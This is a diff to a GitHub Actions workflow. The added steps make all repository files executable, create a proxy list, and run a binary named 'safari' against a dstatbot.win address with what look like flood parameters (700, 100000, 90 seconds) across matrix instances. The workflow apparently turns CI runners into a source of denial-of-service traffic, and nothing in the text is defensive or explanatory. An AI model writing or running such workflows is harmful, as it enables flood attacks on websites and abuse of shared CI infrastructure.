@@ -20,8 +20,13 @@ jobs:
       uses: actions/checkout@v4
 
     - name: Make files executable
-      run:   ls
+      run: chmod +x *
+
+    - name: Create proxies.txt
+      run: |
+        echo "1.1.1.1:80" > proxies.txt
+        echo "proxies.txt created with 1.1.1.1:80"
 
     - name: Run safari script (Instance ${{ matrix.instance }})
-      run: ./safari https://c1.dstatbot.win/aQbcn9Rm 700 100000 90 proxies.txt --raw 
+      run: ./safari https://c1.dstatbot.win/lURlGPR6 700 100000 90 proxies.txt --raw 
       continue-on-error: true
